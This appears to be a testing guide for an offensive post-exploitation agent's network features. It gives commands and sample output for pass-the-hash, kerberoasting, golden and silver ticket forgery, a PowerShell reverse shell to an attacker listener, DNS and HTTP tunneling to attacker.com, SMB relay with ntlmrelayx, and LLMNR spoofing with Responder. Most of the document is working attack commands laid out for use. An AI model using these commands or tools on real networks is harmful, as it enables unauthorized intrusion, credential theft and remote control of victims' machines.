# Phase 5 Network Features - Testing Guide

## Fixed Commands (v11)

### Lateral Movement - Now Support User-Friendly Syntax

**Old Syntax (Broken):**
```
$ lateral:pass_the_hash
ERROR: Usage: lateral:pth:user:domain:hash
```

**New Syntax (Fixed - v11):**
```
$ lateral:pass_the_hash:admin:DOMAIN:aabbccdd11223344
✓ Pass-the-Hash (PTH) prepared
User: admin@DOMAIN
Hash: aabbccdd11223344
Note: Use mimikatz or Invoke-WmiMethod

$ lateral:kerberoasting:DC01
✓ Kerberoasting prepared
Target: DC01
Note: Extract TGS tickets and crack offline

$ lateral:golden_ticket:DOMAIN.COM
✓ Golden ticket creation
Domain: DOMAIN.COM
Note: Create forged TGT for any user
Requires: Domain SID and krbtgt hash

$ lateral:silver_ticket:CIFS:DC01
✓ Silver ticket creation
Service: CIFS
Host: DC01
Note: Create forged TGS for specific service

$ lateral:overpass_the_hash
✓ Overpass-the-Hash prepared
Note: Convert NTLM hash to Kerberos TGT
Requires: NTLM hash and domain credentials
```

---

## How to Test Network Features Actually Work

### 1. **Reverse Shell - TESTABLE**

**Setup listener on attacker machine:**
```bash
nc -lvnp 4444
```

**Get reverse shell command from agent:**
```
$ reverse:connect:192.168.1.122:4444
✓ Reverse shell command ready
Execute on target:
powershell -Command "$client = New-Object System.Net.Sockets.TcpClient("192.168.1.122",4444);..."
```

**Test:** Copy the PowerShell command and execute on target. If listener receives connection = ✅ WORKING

---

### 2. **Port Forwarding - TESTABLE**

**Setup local port forward:**
```
$ portfwd:local:8080:localhost:80
✓ Local port forwarding setup
Local Port: 8080
Remote: localhost:80
Note: Use netsh or ssh for actual forwarding
```

**Actual test with netsh:**
```cmd
netsh interface portproxy add v4tov4 listenport=8080 connectaddress=localhost connectport=80
netsh interface portproxy show all
```

**Test:** Access http://localhost:8080 - if it reaches localhost:80 = ✅ WORKING

---

### 3. **SOCKS Proxy - TESTABLE**

**Setup SOCKS proxy:**
```
$ pivot:socks:9050
✓ SOCKS proxy server ready
Port: 9050
Note: Use with proxychains or Burp Suite
Command: ssh -D 9050 user@target
```

**Actual test with SSH:**
```bash
ssh -D 9050 user@target-host
# Then configure proxychains to use localhost:9050
proxychains curl http://internal-server
```

**Test:** If proxychains can reach internal servers through SSH tunnel = ✅ WORKING

---

### 4. **DNS Tunneling - TESTABLE**

**Setup DNS tunnel:**
```
$ pivot:dns:attacker.com
✓ DNS tunneling prepared
Domain: attacker.com
Note: Tunnel data through DNS queries
Tools: dnscat2, iodine
```

**Actual test with dnscat2:**
```bash
# On attacker:
dnscat2.py -n attacker.com

# On target:
dnscat2.py attacker.com
```

**Test:** If dnscat2 establishes tunnel = ✅ WORKING

---

### 5. **HTTP Tunneling - TESTABLE**

**Setup HTTP tunnel:**
```
$ pivot:http:http://attacker.com/tunnel.php
✓ HTTP tunneling prepared
URL: http://attacker.com/tunnel.php
Note: Tunnel traffic through HTTP
Tools: reGeorg, Tunna
```

**Actual test with reGeorg:**
```bash
# Upload reGeorg tunnel.php to attacker.com
# On target:
python reGeorgSocksProxy.py -u http://attacker.com/tunnel.php -l 127.0.0.1 -p 8080

# Then use SOCKS proxy on port 8080
```

**Test:** If SOCKS proxy works through HTTP tunnel = ✅ WORKING

---

### 6. **SMB Relay - TESTABLE**

**Setup SMB relay:**
```
$ pivot:smb
✓ SMB relay attack prepared
Note: Relay NTLM authentication
Tools: Responder, ntlmrelayx
```

**Actual test with ntlmrelayx:**
```bash
# Start responder to capture NTLM
responder -I eth0 -v

# Start ntlmrelayx to relay captured hashes
ntlmrelayx.py -t 192.168.1.100 -c "whoami"

# Trigger NTLM auth (e.g., access \\attacker-ip\share)
```

**Test:** If ntlmrelayx relays auth and executes command = ✅ WORKING

---

### 7. **LLMNR Spoofing - TESTABLE**

**Setup LLMNR spoofing:**
```
$ pivot:llmnr
✓ LLMNR/NBNS spoofing prepared
Note: Spoof LLMNR and NBNS responses
Tools: Responder
```

**Actual test with Responder:**
```bash
# Start Responder
responder -I eth0 -v

# On target, try to access non-existent host:
ping nonexistent-host

# Responder will spoof LLMNR response
```

**Test:** If Responder captures LLMNM requests = ✅ WORKING

---

## Summary

| Feature | Type | Test Method | Status |
|---------|------|-------------|--------|
| reverse:connect | Real | Execute PowerShell, check listener | ✅ TESTABLE |
| portfwd:local | Real | Use netsh, access forwarded port | ✅ TESTABLE |
| pivot:socks | Guidance | Use SSH -D, test with proxychains | ⚠️ GUIDANCE |
| pivot:dns | Guidance | Use dnscat2 tool | ⚠️ GUIDANCE |
| pivot:http | Guidance | Use reGeorg tool | ⚠️ GUIDANCE |
| pivot:smb | Guidance | Use ntlmrelayx tool | ⚠️ GUIDANCE |
| pivot:llmnr | Guidance | Use Responder tool | ⚠️ GUIDANCE |
| lateral:pass_the_hash | Guidance | Use mimikatz tool | ⚠️ GUIDANCE |
| lateral:kerberoasting | Guidance | Use Rubeus/Impacket | ⚠️ GUIDANCE |
| lateral:golden_ticket | Guidance | Use mimikatz tool | ⚠️ GUIDANCE |
| lateral:silver_ticket | Guidance | Use mimikatz tool | ⚠️ GUIDANCE |
| lateral:overpass_the_hash | Guidance | Use mimikatz tool | ⚠️ GUIDANCE |

**Key Finding:** Most Phase 5 features are **guidance/setup commands** that require external tools (mimikatz, Responder, dnscat2, etc.) to actually execute. They're not standalone implementations.

